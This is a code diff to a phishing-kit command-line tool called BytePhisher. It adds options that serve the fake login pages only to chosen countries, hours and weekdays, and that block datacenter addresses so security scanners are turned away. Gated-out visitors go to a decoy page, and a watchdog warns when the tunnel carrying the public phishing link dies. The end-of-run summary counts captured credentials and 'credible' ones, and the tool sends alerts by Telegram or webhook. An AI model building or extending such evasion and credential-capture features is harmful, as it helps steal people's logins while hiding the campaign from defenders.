@@ -169,6 +169,21 @@ def main():
     ap.add_argument("--rotate", metavar="SLUGS",
                     help="serve a random one of these templates per request "
                          "(comma-separated slugs) — A/B style campaigns")
+    # ---- campaign gating ----
+    ap.add_argument("--allow-country", metavar="CC[,CC]",
+                    help="only serve visitors from these ISO country codes (e.g. IN,US)")
+    ap.add_argument("--block-country", metavar="CC[,CC]",
+                    help="never serve visitors from these country codes")
+    ap.add_argument("--block-datacenter", action="store_true",
+                    help="refuse hosting/datacenter ASNs (kills most scanners)")
+    ap.add_argument("--active-hours", metavar="H1-H2",
+                    help="only serve between these local hours, e.g. 9-18")
+    ap.add_argument("--active-days", metavar="DAYS",
+                    help="only serve on these weekdays, e.g. mon-fri or mon,wed,fri")
+    ap.add_argument("--max-hits", type=int, default=0, metavar="N",
+                    help="refuse an IP after N hits per hour (0 = unlimited)")
+    ap.add_argument("--decoy", metavar="URL",
+                    help="where gated-out visitors go (default: inert 503 page)")
     ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
     args = ap.parse_args()
 
@@ -236,6 +251,21 @@ def main():
     print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
     print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")
 
+    # --- campaign gating (geo / time / rate) ---
+    gate = None
+    if any([args.allow_country, args.block_country, args.block_datacenter,
+            args.active_hours, args.active_days, args.max_hits]):
+        from core.gate import Gate
+        gate = Gate(allow_countries=args.allow_country.split(",") if args.allow_country else None,
+                    block_countries=args.block_country.split(",") if args.block_country else None,
+                    block_datacenter=args.block_datacenter,
+                    active_hours=args.active_hours, active_days=args.active_days,
+                    max_hits_per_ip=args.max_hits)
+        print(f"[bytephisher] gating    : {gate.describe()}")
+        if gate.needs_geo and geo == "off":
+            print("[bytephisher] WARNING   : country/datacenter gating with --geo off "
+                  "blocks everyone (no geo data). Use --geo ipapi or ipinfo.")
+
     # --- capture notifier (Telegram / webhook) ---
     notifier = None
     telegram = args.telegram or cfg.get("telegram")
@@ -256,7 +286,7 @@ def main():
         tls=args.tls, cert_path=args.cert,
         on_capture=notifier, site_name=site["slug"],
         campaign=args.campaign or site["slug"],
-        rotate_dirs=rotate_dirs)
+        rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "")
     # serve_forever() must run in its own thread, otherwise the socket is bound
     # but never accepts connections while the CLI sits in the live-dashboard loop.
     import threading
@@ -335,17 +365,38 @@ def main():
     signal.signal(signal.SIGTERM, _sig)
 
     t0 = time.time()
+    warned_dead = set()
+
+    def _tunnel_watchdog():
+        """Warn loudly if a tunneler dies mid-campaign: the public URL it
+        produced is dead, and a silent dead link wastes a whole campaign."""
+        try:
+            from tunnels import dead_names
+            dead = set(dead_names())
+        except Exception:
+            return
+        new = dead - warned_dead
+        for name in sorted(new):
+            warned_dead.add(name)
+            print(f"\n[bytephisher] WARNING: tunneler '{name}' exited — "
+                  f"its public URL is dead. Restart it or use another tunnel "
+                  f"(e.g. -t all).\n", flush=True)
+
     try:
         if args.no_tui or not sys.stdout.isatty():
             from dashboard import render_plain
+            last_check = time.time()
             while not stop["flag"]:
                 print("\033[2J\033[H", end="")   # ANSI clear (no TERM dependency)
                 render_plain(db.all(40), db.stats())
                 print("\n[ctrl+c to stop]")
+                if urls and time.time() - last_check > 10:
+                    _tunnel_watchdog()
+                    last_check = time.time()
                 time.sleep(3)
         else:
             from dashboard import live_loop
-            live_loop(db, stop, refresh=1.5)
+            live_loop(db, stop, refresh=1.5, watchdog=_tunnel_watchdog if urls else None)
     except KeyboardInterrupt:
         pass
     finally:
@@ -357,7 +408,14 @@ def main():
         print(f"  runtime            : {runtime // 60}m {runtime % 60}s")
         print(f"  total captures     : {stats['total_captures']}")
         print(f"  credential captures: {stats['credentials']}")
+        print(f"  credible (low risk): {stats.get('credible_credentials', 0)}")
         print(f"  unique visitors    : {stats['visitors']}")
+        try:
+            bs = db.blocked_stats()
+            if bs["total_blocked"]:
+                print(f"  gated out          : {bs['total_blocked']}")
+        except Exception:
+            pass
         if urls:
             print("  public urls:")
             for n, u in urls.items():
